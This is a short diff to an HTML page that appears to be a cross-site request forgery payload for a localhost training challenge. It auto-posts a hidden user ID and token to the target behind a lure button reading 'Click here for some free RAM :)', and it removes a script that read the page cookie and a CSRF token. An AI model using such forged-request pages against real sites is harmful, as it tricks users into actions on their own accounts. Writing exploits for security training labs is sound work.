@@ -3,15 +3,9 @@
 	<body>
 		<form action="https://localhost/user/csrfchallengefive/plusplus/" method="POST">
 			<input type="hidden" name="userId" value="493e4f0907a322ec2a340f61d60e0595b1c9969a">
-			<input id="csrfToken" type="hidden" name="csrfToken">
-			<button>Click here for some free RAM :)</button> 
+			<input id="csrfToken" type="hidden" value="" name="csrfToken">
+			<input type="submit">Click here for some free RAM :)</input> 
 		</form>
 	</body>
-	<script>
-		console.log(document.cookie);
-		var csrf = document.querySelector('meta[name="token"]').content;
-		console.log(csrf)
-		document.getElementById('csrfToken').value = csrf
-	</script>
 </html>
 
